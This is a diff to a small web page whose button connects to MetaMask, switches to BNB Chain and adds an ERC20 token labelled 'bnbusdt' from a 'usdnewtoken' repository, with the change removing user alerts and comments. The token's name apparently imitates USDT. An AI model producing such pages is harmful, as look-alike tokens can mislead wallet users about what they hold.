@@ -31,8 +31,9 @@
 </head>
 <body>
     <div class="container">
-        <img src="https://raw.githubusercontent.com/usdnewtoken/us/main/t/click.png" onclick="addToken()" alt="Add Token">  <!-- تغییر به GitHub raw -->
+        <img src="https://raw.githubusercontent.com/usdnewtoken/us/main/t/click.png" onclick="addToken()" alt="Add Token">
     </div>
+
     <script>
         async function switchToBNBChain() {
             try {
@@ -63,19 +64,22 @@
                 }
             }
         }
+
         async function addToken() {
             if (!window.ethereum) {
-                alert('MetaMask is not installed. Please install MetaMask extension.');  // بهتر از console
+                console.error('MetaMask is not installed. Please install MetaMask extension.');
                 return;
             }
+
             if (!window.ethereum.isMetaMask) {
-                alert('Ethereum provider detected, but it is not MetaMask.');
+                console.error('Ethereum provider detected, but it is not MetaMask.');
                 return;
             }
+
             try {
                 await window.ethereum.request({ method: 'eth_requestAccounts' });
                 await switchToBNBChain();
-                const result = await window.ethereum.request({
+                await window.ethereum.request({
                     method: 'wallet_watchAsset',
                     params: {
                         type: 'ERC20',
@@ -83,18 +87,12 @@
                             address: '0x11DC2517f3EE051C3e4164d94a42B84Ed96801F3',
                             symbol: 'bnbusdt',
                             decimals: 18,
-                            image: 'https://raw.githubusercontent.com/usdnewtoken/us/main/t/bnbusdt.png',  // تغییر به GitHub raw (آپلود کن)
+                            image: 'https://raw.githubusercontent.com/usdnewtoken/us/main/t/bnbusdt.png',
                         },
                     },
                 });
-                if (result) {
-                    alert('Token added successfully!');
-                } else {
-                    alert('Failed to add token. Check if address is valid.');
-                }
             } catch (error) {
                 console.error('Error adding token:', error);
-                alert('Error: ' + error.message + '. Check console for details.');
             }
         }
     </script>
